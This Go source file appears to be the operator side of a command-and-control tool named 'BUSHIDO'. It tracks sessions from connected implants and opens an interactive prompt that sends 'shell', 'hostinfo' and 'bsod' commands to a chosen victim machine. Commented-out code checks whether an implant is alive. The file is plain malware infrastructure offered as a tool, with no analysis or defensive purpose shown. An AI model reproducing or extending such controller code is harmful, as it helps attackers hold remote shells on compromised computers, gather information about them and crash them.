package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
)

func NewSessionList() *SessionList {
	return &SessionList{
		Stop: make(chan struct{}),
	}
}

// registerListener registers a new listener
func (ll *SessionList) registerSession(port string, conn net.Conn) {
	id := rand.Intn(9000)
	// Create a new Session struct
	newSession := &Session{
		id:     id,
		Port:   port,
		Status: "Active",
		Conn:   conn,
	}
	// Add to the head of the linked list
	newSession.Next = ll.Head
	ll.Head = newSession
}

// displaySessions displays the active sessions
func (ll *SessionList) displaySessions() {
	fmt.Println("\nActive Sessions:")
	current := ll.Head
	for current != nil {
		fmt.Println("SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
	fmt.Println()
}

// func (ll *SessionList) updateSessionStatus(targetPort string, status string, conn net.Conn) {
// 	current := ll.Head
// 	for current.Port != targetPort {
// 		current = current.Next
// 	}
// 	current.Status = status
// 	current.Conn = conn
// }

func (ll *SessionList) closeSessions() {
	fmt.Println()
	current := ll.Head
	for current != nil {
		fmt.Println("Unit on", current.id, "lost")
		current.Conn.Close()
		current.Conn = nil // Clear the connections list

		current = current.Next
	}
	fmt.Println()
	ll.Head = nil // Reset the listener list
}

// func isAliveQuick(conn *net.Conn) bool {
// 	buff := make([]byte, 9000)
// 	(*conn).Write([]byte("AreYouAlive"))
// 	read_len, err := (*conn).Read([]byte(buff))
// 	for i := 0; i < 3; i++ {
// 		if read_len <= 1 {
// 			fmt.Println("Something Went Wrong")
// 			return false
// 		}
// 		if err != nil {
// 			fmt.Println("Something Went Wrong")
// 			return false
// 		}
// 		strBuff := string(buff)
// 		fmt.Println(strBuff)
// 		if strBuff == "IAMALIVE" {
// 			fmt.Println("Agent is Alive")
// 			return true
// 		}
// 		time.Sleep(5 * time.Second)
// 	}
// 	fmt.Println("Implant could not be reached")
// 	return false
// }

func openSession(id int, sl *SessionList) {
	//sl.displaySessions()
	current := sl.Head
	if current == nil {
		fmt.Println("\nSession not found\n")
		return
	}
	for current.id != id && current != nil {
		current = current.Next
		if current == nil {
			fmt.Println("\nSession not found\n")
			return
		}
	}
	fmt.Println("\nSession Found !")
	fmt.Println("Connecting ...")
	//Impliment some sort of auth. Hash some string. If agent responds with the same hash super. If agent is late kill. If agent responds false kill.
	// if !isAliveQuick(&current.Conn) {
	// 	fmt.Println("Could Not Open the Session")
	// 	return
	// }
	fmt.Println("BUSHIDO Shell Open ...\n")
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("BU$H1D0-1 >> ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		command = strings.TrimSpace(command)
		switch command {
		case "shell":
			shell(&current.Conn)
		case "hostinfo":
			hostinfo(&current.Conn)
		case "bsod":
			bsod(&current.Conn)
		case "bg":
			return
		case "exit":
			return
		default:
			fmt.Println("\nUsage: shell, hostinfo, bg\n")
		}
	}
}
